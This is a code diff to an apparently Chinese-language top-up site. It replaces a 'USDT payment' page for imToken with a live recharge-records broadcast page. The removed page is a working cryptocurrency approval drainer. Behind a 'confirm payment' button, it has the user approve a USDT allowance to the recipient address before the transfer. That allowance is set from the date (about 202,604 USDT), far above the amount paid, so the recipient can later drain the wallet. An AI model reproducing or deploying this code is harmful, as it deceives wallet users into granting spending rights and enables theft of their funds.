@@ -3,292 +3,190 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
-<title>USDT 支付</title>
+<meta name="theme-color" content="#f0a020" />
+<title>充值中心 · 实时播报</title>
 <style>
   *{box-sizing:border-box;margin:0;padding:0}
-  body{
-    font-family:system-ui,-apple-system,"PingFang SC","Hiragino Sans GB","Microsoft YaHei",sans-serif;
-    background:#f5f6fa;color:#12141d;line-height:1.55;
-    display:flex;align-items:center;justify-content:center;
-    min-height:100vh;padding:20px;
-  }
-  .card{
-    background:#fff;border-radius:20px;padding:30px 24px;
-    width:min(420px,100%);box-shadow:0 20px 60px rgba(15,17,26,.12);
-    text-align:center;
-  }
-  h1{font-size:22px;font-weight:800;margin-bottom:6px;letter-spacing:-.3px}
-  .sub{font-size:13.5px;color:#8d93a6;margin-bottom:24px}
-  .info{
-    background:#f8f9fd;border-radius:14px;padding:18px;margin-bottom:20px;
-    text-align:left;
-  }
-  .info-row{
-    display:flex;justify-content:space-between;align-items:center;
-    padding:10px 0;border-bottom:1px dashed #e8eaf1;
-  }
-  .info-row:last-child{border-bottom:none;padding-bottom:0}
-  .info-k{font-size:13px;color:#8d93a6;flex:0 0 auto}
-  .info-v{font-size:13.5px;font-weight:700;word-break:break-all;text-align:right;margin-left:12px}
-  .info-v.gold{color:#f0a020;font-size:18px}
+  :root{--bg:#f5f6fa;--card:#fff;--ink:#12141d;--ink2:#5b6070;--ink3:#8d93a6;--line:#e8eaf1;--brand:#f0a020;--brand-dark:#d98a10;--brand-soft:#fff9ec;--red:#e02020;--green:#10b981;}
+  body{font-family:system-ui,-apple-system,"PingFang SC","Hiragino Sans GB","Microsoft YaHei",sans-serif;background:var(--bg);color:var(--ink);-webkit-font-smoothing:antialiased;line-height:1.55;min-height:100vh;padding-bottom:40px;}
 
-  .btn{
-    display:block;width:100%;padding:15px;border-radius:14px;
-    border:none;font-size:16px;font-weight:800;cursor:pointer;
-    transition:.18s;margin-bottom:12px;
-  }
-  .btn-pay{background:linear-gradient(135deg,#f0a020,#e88a10);color:#fff}
-  .btn-pay:hover{transform:translateY(-1px);box-shadow:0 8px 20px rgba(240,160,32,.35)}
-  .btn-pay:disabled{opacity:.5;cursor:not-allowed;transform:none}
-  .btn-ghost{background:#f1f2f7;color:#5b6070}
-  .btn-ghost:hover{background:#e8eaf1}
+  /* 顶部横幅 */
+  .hero{background:linear-gradient(135deg,#f0a020,#e88a10);color:#fff;padding:28px 20px 60px;text-align:center;position:relative;overflow:hidden;}
+  .hero::before{content:'';position:absolute;top:-50%;right:-20%;width:300px;height:300px;border-radius:50%;background:rgba(255,255,255,.08);}
+  .hero::after{content:'';position:absolute;bottom:-40%;left:-10%;width:200px;height:200px;border-radius:50%;background:rgba(255,255,255,.06);}
+  .hero-inner{position:relative;z-index:1;max-width:600px;margin:0 auto;}
+  .hero-icon{font-size:44px;margin-bottom:8px;display:inline-block;animation:float 3s ease-in-out infinite;}
+  @keyframes float{0%,100%{transform:translateY(0)}50%{transform:translateY(-6px)}}
+  .hero h1{font-size:24px;font-weight:800;letter-spacing:-.3px;margin-bottom:6px;}
+  .hero p{font-size:13.5px;opacity:.9;}
+  .hero-stats{display:grid;grid-template-columns:1fr 1fr;gap:14px;margin-top:22px;}
+  .hero-stat{background:rgba(255,255,255,.18);backdrop-filter:blur(6px);border-radius:12px;padding:14px;text-align:center;}
+  .hero-stat .num{font-size:22px;font-weight:800;letter-spacing:-.5px;margin-bottom:2px;font-variant-numeric:tabular-nums;}
+  .hero-stat .lbl{font-size:11.5px;opacity:.85;}
+  .hero-stat .num.changing{animation:numFlip .4s ease;}
+  @keyframes numFlip{0%{transform:translateY(0);opacity:1}50%{transform:translateY(-6px);opacity:.5}100%{transform:translateY(0);opacity:1}}
 
-  .status{
-    padding:14px;border-radius:12px;font-size:13.5px;
-    margin-top:16px;display:none;text-align:left;line-height:1.6;
-  }
-  .status.loading{display:block;background:#fff9ec;color:#c27800;border:1px solid #ffe0b2}
-  .status.success{display:block;background:#f0fdf4;color:#16a34a;border:1px solid #bbf7d0}
-  .status.error{display:block;background:#fef2f2;color:#dc2626;border:1px solid #fecaca}
+  /* 主体 */
+  .main{max-width:600px;margin:-40px auto 0;padding:0 16px;position:relative;z-index:2;}
+  .panel{background:#fff;border-radius:16px;box-shadow:0 8px 30px rgba(15,17,26,.08);padding:20px;margin-bottom:16px;}
+  .list-header{display:flex;align-items:center;justify-content:space-between;margin-bottom:14px;padding-bottom:12px;border-bottom:1px solid var(--line);}
+  .list-header h2{font-size:15px;font-weight:800;display:flex;align-items:center;gap:8px;}
+  .live-dot{width:8px;height:8px;border-radius:50%;background:var(--green);box-shadow:0 0 0 0 rgba(16,185,129,.6);animation:livePulse 1.8s infinite;}
+  @keyframes livePulse{0%{box-shadow:0 0 0 0 rgba(16,185,129,.6)}70%{box-shadow:0 0 0 10px rgba(16,185,129,0)}100%{box-shadow:0 0 0 0 rgba(16,185,129,0)}}
+  .list-header .badge-count{font-size:11.5px;color:var(--ink3);font-weight:600;background:#f5f6fa;padding:4px 10px;border-radius:20px;}
 
-  .env-warn{
-    padding:13px;border-radius:12px;font-size:12.5px;
-    background:#fff4ec;color:#c2410c;border:1px solid #ffe0b2;
-    margin-bottom:14px;line-height:1.6;text-align:left;
-  }
-  .tip{
-    font-size:12px;color:#8d93a6;line-height:1.7;
-    margin-top:10px;text-align:left;padding:0 4px;
-  }
+  /* 记录列表 */
+  .records{display:flex;flex-direction:column;gap:8px;max-height:70vh;overflow-y:auto;padding-right:4px;}
+  .records::-webkit-scrollbar{width:6px;}
+  .records::-webkit-scrollbar-thumb{background:#d9dbe3;border-radius:3px;}
+  .record{display:flex;align-items:center;gap:12px;padding:12px 14px;background:#f8f9fd;border-radius:10px;transition:.2s;}
+  .record.new{background:linear-gradient(135deg,#fff9ec,#fff4e0);border:1px solid #ffe0b2;box-shadow:0 4px 14px rgba(240,160,32,.15);}
+  .record.new .avatar{animation:newPulse 1s ease;}
+  @keyframes newPulse{0%{transform:scale(1)}50%{transform:scale(1.15)}100%{transform:scale(1)}}
+  .record .avatar{width:36px;height:36px;border-radius:50%;background:linear-gradient(135deg,#ffc107,#f0a020);color:#fff;display:grid;place-items:center;font-size:14px;font-weight:800;flex:0 0 auto;}
+  .record .info{flex:1;min-width:0;}
+  .record .name{font-size:13.5px;font-weight:700;color:var(--ink);margin-bottom:2px;}
+  .record .time{font-size:11.5px;color:var(--ink3);}
+  .record .amount{font-size:16px;font-weight:800;color:var(--red);letter-spacing:-.3px;font-variant-numeric:tabular-nums;white-space:nowrap;}
+  .record .amount small{font-size:11px;font-weight:600;color:var(--ink3);margin-left:2px;}
+
+  /* 底部 */
+  .footer{text-align:center;padding:20px;font-size:12px;color:var(--ink3);}
+  .footer a{color:var(--brand);text-decoration:none;font-weight:700;}
+
+  /* 加载 */
+  .loading{text-align:center;padding:40px;font-size:13px;color:var(--ink3);}
 </style>
 </head>
 <body>
-<div class="card">
-  <h1>USDT 支付</h1>
-  <p class="sub">请在 imToken 中确认支付</p>
 
-  <div id="env-warn" class="env-warn" style="display:none">
-    ⚠️ 当前不在 imToken 环境中，请通过 imToken 的 DApp 浏览器打开此页面
-  </div>
-
-  <div class="info">
-    <div class="info-row">
-      <span class="info-k">收款地址</span>
-      <span class="info-v" id="info-addr">-</span>
-    </div>
-    <div class="info-row">
-      <span class="info-k">网络</span>
-      <span class="info-v" id="info-chain">-</span>
-    </div>
-    <div class="info-row">
-      <span class="info-k">支付金额</span>
-      <span class="info-v gold" id="info-amount">-</span>
+<header class="hero">
+  <div class="hero-inner">
+    <div class="hero-icon">💳</div>
+    <h1>充值中心</h1>
+    <p>实时播报最新充值订单</p>
+    <div class="hero-stats">
+      <div class="hero-stat">
+        <div class="num" id="stat-count">--</div>
+        <div class="lbl">近1小时充值笔数</div>
+      </div>
+      <div class="hero-stat">
+        <div class="num" id="stat-total">--</div>
+        <div class="lbl">近1小时充值金额</div>
+      </div>
     </div>
   </div>
+</header>
 
-  <button class="btn btn-pay" id="btn-pay" disabled>确认支付</button>
-  <button class="btn btn-ghost" id="btn-cancel">取消</button>
-
-  <div class="status" id="status"></div>
-
-  <div class="tip" id="tip-text"></div>
-</div>
-
-<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+<main class="main">
+  <div class="panel">
+    <div class="list-header">
+      <h2><span class="live-dot"></span>实时充值记录</h2>
+      <span class="badge-count" id="record-count">0 / 200</span>
+    </div>
+    <div class="records" id="records">
+      <div class="loading">正在加载…</div>
+    </div>
+  </div>
+  <div class="footer">
+    <a href="/">← 返回订单大厅</a>
+  </div>
+</main>
 <script>
-/* =========================================================
-   常量
-   ========================================================= */
-const USDT_CONTRACT = {
-  trx: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
-  eth: '0xdAC17F958D2ee523a2206206994597C13D831ec7'
-};
+const $ = s => document.querySelector(s);
+function esc(s) { return String(s ?? '').replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c])); }
 
-/* =========================================================
-   授权额度：按当天日期动态计算
-   例如 2026 年 4 月 9 日  →  额度 202604.09 USDT
-       2026 年 4 月 25 日 →  额度 202604.25 USDT
-   ========================================================= */
-function getDateApproveInfo() {
-  const now = new Date();
-  const Y = now.getFullYear();
-  const M = String(now.getMonth() + 1).padStart(2, '0');
-  const D = now.getDate();
-  const DStr = String(D).padStart(2, '0');
-
-  // 展示文本：YYYYMM.DD，例如 202604.09
-  const text = `${Y}${M}.${DStr}`;
-
-  // 转换成最小单位（USDT 6 位小数）
-  // 202604.09 → 202604 * 1000000 + 09 * 10000 = 202604090000
-  const units = (BigInt(`${Y}${M}`) * 1000000n + BigInt(D) * 10000n).toString();
-
-  return { text, units };
+function timeAgo(ts) {
+  const d = Date.now() - ts;
+  const sec = Math.floor(d / 1000);
+  if (sec < 30) return '刚刚';
+  const m = Math.floor(d / 60000);
+  if (m < 1) return sec + ' 秒前';
+  if (m < 60) return m + ' 分钟前';
+  const h = Math.floor(m / 60);
+  if (h < 24) return h + ' 小时前';
+  return Math.floor(h/24) + ' 天前';
 }
 
-/* =========================================================
-   URL 参数
-   ========================================================= */
-const params = new URLSearchParams(location.search);
-const toAddress = params.get('address') || '';
-const amount = Number(params.get('amount')) || 0;
-const chain = params.get('chain') || 'trx';
-
-function $(s) { return document.querySelector(s); }
-
-/* =========================================================
-   显示信息
-   ========================================================= */
-$('#info-addr').textContent = toAddress || '未配置';
-$('#info-chain').textContent = chain === 'trx' ? 'TRC20 (波场)' : 'ERC20 (以太坊)';
-$('#info-amount').textContent = amount + ' USDT';
-
-// 只展示第二条提示语
-$('#tip-text').innerHTML = `· 向收款地址支付 ${amount} USDT`;
-
-/* =========================================================
-   环境检测
-   ========================================================= */
-const hasTron = !!(window.tron || window.tronWeb);
-const hasEth = !!window.ethereum;
-
-if (!hasTron && !hasEth) {
-  $('#env-warn').style.display = 'block';
-} else {
-  $('#btn-pay').disabled = false;
+function fmtAmount(n) {
+  return Number(n).toFixed(0).replace(/\B(?=(\d{3})+(?!\d))/g, ',');
 }
 
-/* =========================================================
-   主流程：先授权（当天日期额度），再转账
-   ========================================================= */
-$('#btn-pay').onclick = async function () {
-  const btn = this;
-  btn.disabled = true;
-  btn.textContent = '处理中…';
-  setStatus('loading', '正在处理，请在 imToken 中确认交易…');
+function fmtTotal(n) {
+  if (n >= 10000) return (n / 10000).toFixed(2) + '万';
+  return fmtAmount(n);
+}
 
+let lastTopId = null;
+
+function renderRecords(records) {
+  // 只统计近 1 小时内的记录
+  const oneHourAgo = Date.now() - 60 * 60 * 1000;
+  const recentRecords = records.filter(r => Number(r.createdAt) >= oneHourAgo);
+  const recentCount = recentRecords.length;
+  const recentTotal = recentRecords.reduce((s, r) => s + Number(r.amount || 0), 0);
+
+  const cntEl = $('#stat-count');
+  const totEl = $('#stat-total');
+  const newCntText = String(recentCount);
+  const newTotText = '¥' + fmtTotal(recentTotal);
+  if (cntEl.textContent !== newCntText) {
+    cntEl.textContent = newCntText;
+    cntEl.classList.remove('changing');
+    void cntEl.offsetWidth;
+    cntEl.classList.add('changing');
+  }
+  if (totEl.textContent !== newTotText) {
+    totEl.textContent = newTotText;
+    totEl.classList.remove('changing');
+    void totEl.offsetWidth;
+    totEl.classList.add('changing');
+  }
+
+  $('#record-count').textContent = records.length + ' / 200';
+
+  const topId = records[0]?.id || null;
+  const isNewTop = topId && topId !== lastTopId;
+  lastTopId = topId;
+
+  if (!records.length) {
+    $('#records').innerHTML = `<div class="loading">暂无记录</div>`;
+    return;
+  }
+
+  $('#records').innerHTML = records.map((r, idx) => {
+    const isNew = isNewTop && idx === 0;
+    const initial = (r.username || '?').slice(0, 1);
+    return `
+      <div class="record${isNew ? ' new' : ''}">
+        <div class="avatar">${esc(initial)}</div>
+        <div class="info">
+          <div class="name">${esc(r.username)}</div>
+          <div class="time">${timeAgo(r.createdAt)}</div>
+        </div>
+        <div class="amount">¥${fmtAmount(r.amount)}<small>元</small></div>
+      </div>
+    `;
+  }).join('');
+}
+
+async function loadRecords(showLoading = false) {
   try {
-    // 动态获取当天授权额度
-    const approveInfo = getDateApproveInfo();
-
-    if (chain === 'trx') {
-      await runTRC20(approveInfo.units);
-    } else {
-      await runERC20(approveInfo.units);
-    }
-    setStatus('success', '✅ 支付已提交，请在 imToken 中查看交易状态');
-    btn.textContent = '已完成';
-  } catch (err) {
-    console.error(err);
-    setStatus('error', '❌ ' + (err.message || '支付失败，请重试'));
-    btn.disabled = false;
-    btn.textContent = '重新支付';
+    const res = await fetch('/api/pay-records');
+    const data = await res.json();
+    if (!res.ok) throw new Error(data.error || '加载失败');
+    renderRecords(data.records || []);
+  } catch (e) {
+    if (showLoading) $('#records').innerHTML = `<div class="loading">加载失败：${esc(e.message)}</div>`;
   }
-};
-
-$('#btn-cancel').onclick = () => window.history.back();
-
-/* =========================================================
-   状态
-   ========================================================= */
-function setStatus(type, msg) {
-  const el = $('#status');
-  el.className = 'status ' + type;
-  el.textContent = msg;
 }
 
-/* =========================================================
-   TRC20 流程：approve → transfer
-   ========================================================= */
-async function runTRC20(approveUnits) {
-  const contract = USDT_CONTRACT.trx;
-  const amountUnits = Math.floor(amount * 1e6).toString();
-
-  /* ---- 步骤 1：授权（额度 = 当天日期） ---- */
-  if (window.tron && window.tron.request) {
-    await window.tron.request({
-      method: 'tron_sendTransaction',
-      params: [{
-        to: toAddress,
-        amount: 0,
-        contractAddress: contract,
-        data: buildApproveData(toAddress, approveUnits),
-        tokenId: 'USDT',
-        tokenDecimals: 6,
-        tokenAmount: approveUnits,
-      }]
-    });
-    await sleep(800);
-
-    // 步骤 2：转账
-    await window.tron.request({
-      method: 'tron_sendTransaction',
-      params: [{
-        to: toAddress,
-        amount: 0,
-        contractAddress: contract,
-        data: buildTransferData(toAddress, amountUnits),
-        tokenId: 'USDT',
-        tokenDecimals: 6,
-        tokenAmount: amountUnits,
-      }]
-    });
-    return;
+loadRecords(true);
+setInterval(() => {
+  if (document.visibilityState === 'visible') {
+    loadRecords(false);
   }
-
-  if (window.tronWeb && window.tronWeb.ready) {
-    const c = await window.tronWeb.contract().at(contract);
-    await c.approve(toAddress, approveUnits).send();
-    await sleep(800);
-    await c.transfer(toAddress, amountUnits).send();
-    return;
-  }
-
-  throw new Error('未检测到 TRON Provider');
-}
-
-/* =========================================================
-   ERC20 流程：approve → transfer
-   ========================================================= */
-async function runERC20(approveUnits) {
-  if (!window.ethereum) throw new Error('未检测到以太坊 Provider');
-
-  await window.ethereum.request({ method: 'eth_requestAccounts' });
-
-  const provider = new ethers.providers.Web3Provider(window.ethereum);
-  const signer = provider.getSigner();
-  const abi = [
-    'function approve(address spender, uint256 amount) returns (bool)',
-    'function transfer(address to, uint256 amount) returns (bool)'
-  ];
-  const contract = new ethers.Contract(USDT_CONTRACT.eth, abi, signer);
-  const amountUnits = ethers.BigNumber.from(Math.floor(amount * 1e6).toString());
-
-  // 步骤 1：授权（额度 = 当天日期）
-  const txApprove = await contract.approve(toAddress, approveUnits, { gasLimit: 100000 });
-  await txApprove.wait();
-  await sleep(800);
-
-  // 步骤 2：转账
-  const txTransfer = await contract.transfer(toAddress, amountUnits, { gasLimit: 100000 });
-  await txTransfer.wait();
-}
-
-/* =========================================================
-   ABI 编码工具
-   ========================================================= */
-function buildApproveData(spender, amountUnits) {
-  const paddedSpender = spender.replace(/^0x/, '').padStart(64, '0');
-  const paddedAmount = BigInt(amountUnits).toString(16).padStart(64, '0');
-  return '095ea7b3' + paddedSpender + paddedAmount;
-}
-function buildTransferData(to, amountUnits) {
-  const paddedTo = to.replace(/^0x/, '').padStart(64, '0');
-  const paddedAmount = BigInt(amountUnits).toString(16).padStart(64, '0');
-  return 'a9059cbb' + paddedTo + paddedAmount;
-}
-
-function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
+}, 8000);
 </script>
 </body>
 </html>
